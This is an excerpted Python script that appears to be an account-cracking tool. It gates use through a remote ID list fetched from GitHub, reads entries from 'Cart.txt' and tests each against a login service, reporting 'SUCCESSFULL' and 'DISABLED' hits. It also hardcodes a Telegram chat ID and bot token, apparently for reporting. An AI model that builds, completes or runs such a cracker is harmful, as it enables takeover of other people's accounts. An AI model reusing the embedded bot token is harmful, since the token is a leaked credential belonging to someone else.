...
def chk():
  ...
  try:
    HAMA = requests.get("https://raw.githubusercontent.com/kakshafo/7usa/main/IDACTIVE.txt").text
    if id in HAMA :
...
id_my = '1408895537'
token_my = '1612708127:AAHz8kiMddk4vzTYRv6wp-4o-aPk64XEuKg'
...
def aco():
	...
	if reb=='1':
		sfr = input(' \x1b[1;97m CLICK ONE:\033[32m ')
		op=open('Cart.txt','w')
...
def crack():
	...
	for x in open('Cart.txt','r').read().splitlines():
		...
		if ('"authenticated":true') in reba:
			...
			print(logo)
			print(logo2)
			print('\033[32m SUCCESSFULL : '+str(r1))
			print('\033[93m DISABLED : '+str(r2))
...
print(logo2)
id_tg = '1408895537' 
token_bot= '1612708127:AAHz8kiMddk4vzTYRv6wp-4o-aPk64XEuKg'
time.sleep(0.5)
menu()
